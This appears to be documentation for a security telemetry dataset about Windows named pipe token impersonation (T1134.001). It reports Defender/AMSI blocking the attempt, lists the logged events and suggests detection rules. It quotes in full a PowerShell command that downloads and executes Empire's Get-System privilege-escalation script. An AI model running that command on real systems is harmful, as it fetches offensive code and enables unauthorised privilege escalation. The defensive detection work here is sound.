# T1134.001-1: Token Impersonation/Theft — Named pipe client impersonation

## Technique Context

T1134.001, Token Impersonation/Theft, is a privilege escalation and defense evasion technique where attackers manipulate Windows access tokens to run code in the context of a different user or process. Named pipe impersonation is one of the most common variants — it exploits the Windows named pipe infrastructure by creating a service that connects to a named pipe, allowing the attacking process to impersonate the connecting client. This technique is particularly effective because it doesn't require SeDebugPrivilege, unlike direct token duplication methods.

The detection community focuses heavily on this technique due to its prevalence in post-exploitation frameworks like Metasploit, Empire, and Cobalt Strike. Key detection points include service creation with suspicious command lines, named pipe creation patterns, process access events targeting high-privilege processes, and privilege escalation attempts. Security teams monitor for the creation of temporary services, unusual process access patterns, and token privilege adjustments.

## What This Dataset Contains

This dataset captures a PowerShell-based attempt to download and execute the Empire framework's Get-System.ps1 script, which implements named pipe impersonation for privilege escalation. The attempt was blocked by Windows Defender's AMSI (Anti-Malware Scan Interface) protection.

The key telemetry includes:

**PowerShell Script Block Logging (EID 4104)**: Captured the full malicious command line attempting to download and execute the Get-System script: `IEX (IWR 'https://raw.githubusercontent.com/BC-SECURITY/Empire/f6efd5a963d424a1f983d884b637da868e5df466/data/module_source/privesc/Get-System.ps1' -UseBasicParsing); Get-System -Technique NamedPipe -Verbose`

**AMSI Block Event (EID 4100)**: "This script contains malicious content and has been blocked by your antivirus software" — showing Defender's real-time protection blocking the malicious payload before execution.

**Process Creation (Security EID 4688, Sysmon EID 1)**: Shows the PowerShell process spawning with the malicious command line, plus a whoami.exe execution indicating system reconnaissance.

**Token Privilege Adjustment (Security EID 4703)**: Documents privilege escalation with multiple high-privilege tokens being enabled: `SeAssignPrimaryTokenPrivilege`, `SeBackupPrivilege`, `SeRestorePrivilege`, `SeLoadDriverPrivilege`, etc.

**Process Access Events (Sysmon EID 10)**: Shows PowerShell accessing both whoami.exe and another PowerShell process with full access rights (0x1FFFFF), indicating privilege manipulation attempts.

**Named Pipe Creation (Sysmon EID 17)**: Three pipe creation events for PowerShell host pipes, showing the inter-process communication infrastructure being established.

## What This Dataset Does Not Contain

This dataset does not contain successful token impersonation telemetry because Windows Defender blocked the malicious script before it could execute the named pipe impersonation technique. Missing elements include:

- **Service Creation Events**: No Security EID 7034, 7035, or 7036 events showing the creation and starting of the temporary service that would be used for named pipe impersonation
- **Actual Named Pipe Impersonation**: The pipe creation events are only for PowerShell host communication, not the malicious pipes that would be created for privilege escalation
- **Successful Token Manipulation**: While we see some privilege adjustments, we don't see the successful token impersonation that would occur after pipe connection
- **Service-Related Process Creation**: Missing the cmd.exe or other service-spawned processes that would execute the pipe connection command
- **File System Artifacts**: No temporary files or service executable drops that typically accompany this technique

The AMSI protection effectively prevented the technique from progressing beyond the initial download and script loading phase.

## Assessment

This dataset provides excellent telemetry for detecting the initial stages of token impersonation attacks, particularly those using PowerShell delivery mechanisms. The combination of PowerShell script block logging, AMSI blocking events, and process access monitoring creates multiple detection opportunities. However, the protective controls prevented the technique from fully executing, limiting the dataset's utility for understanding the complete attack flow.

The Security audit policy and Sysmon configuration captured the essential process creation, privilege adjustment, and process access events effectively. The inclusion of token privilege adjustment events (EID 4703) is particularly valuable as this is often overlooked in detection strategies.

## Detection Opportunities Present in This Data

1. **PowerShell Download-and-Execute Pattern**: Detect `IEX (IWR` patterns in PowerShell script blocks, especially when downloading from known offensive security repositories like BC-SECURITY/Empire.

2. **AMSI Malicious Content Blocks**: Monitor PowerShell EID 4100 events indicating "malicious content" blocks — these represent successful prevention of potential threats.

3. **Empire Framework Indicators**: Alert on downloads from `raw.githubusercontent.com/BC-SECURITY/Empire/` URLs or references to Get-System functionality.

4. **Bulk Privilege Escalation**: Detect Security EID 4703 events where multiple high-privilege tokens are enabled simultaneously, particularly combinations including SeBackupPrivilege, SeRestorePrivilege, and SeAssignPrimaryTokenPrivilege.

5. **PowerShell Process Access with Full Rights**: Monitor Sysmon EID 10 events where PowerShell processes access other processes with 0x1FFFFF access rights — this indicates potential token manipulation.

6. **Suspicious PowerShell Command Lines**: Alert on PowerShell processes spawned with Empire-specific parameters like `-Technique NamedPipe` or references to privilege escalation tools.

7. **Cross-Process PowerShell Access**: Detect when PowerShell processes access other PowerShell instances, as this can indicate token duplication or impersonation attempts.
